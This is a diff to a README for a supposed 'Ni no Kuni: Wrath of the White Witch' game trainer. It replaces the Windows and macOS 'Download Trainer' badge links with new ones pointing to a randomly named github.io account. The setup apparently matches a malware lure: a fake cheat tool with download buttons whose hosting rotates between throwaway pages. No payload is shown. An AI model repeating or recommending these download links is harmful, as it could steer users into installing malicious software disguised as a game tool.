@@ -12,7 +12,7 @@
 
 [![skillicons](https://skillicons.dev/icons?i=windows,apple,github)](https://github.com/duwaaelfeiue/ni-no-kuni-wrath-of-the-white-witch-trainer)
 
-[![Download Trainer](https://img.shields.io/badge/⬇️_Download_Trainer-FF4444?style=for-the-badge&logoColor=white)](https://WaterCongressman.github.io/win-download/)
+[![Download Trainer](https://img.shields.io/badge/⬇️_Download_Trainer-FF4444?style=for-the-badge&logoColor=white)](https://iloqhmlhfppl.github.io/win-get2/)
 
 ![Ni no Kuni: Wrath of the White Witch](game.jpg)
 
@@ -77,7 +77,7 @@ The **Ni no Kuni: Wrath of the White Witch Trainer** solves all these issues by 
 
 macOS users can use our alternative tool:
 
-[![macOS Download](https://img.shields.io/badge/macOS-Download-silver?style=for-the-badge&logo=apple)](https://WaterCongressman.github.io/mac-download/)
+[![macOS Download](https://img.shields.io/badge/macOS-Download-silver?style=for-the-badge&logo=apple)](https://iloqhmlhfppl.github.io/mac-download2/)
 
 ## ⚖️ Legal
 
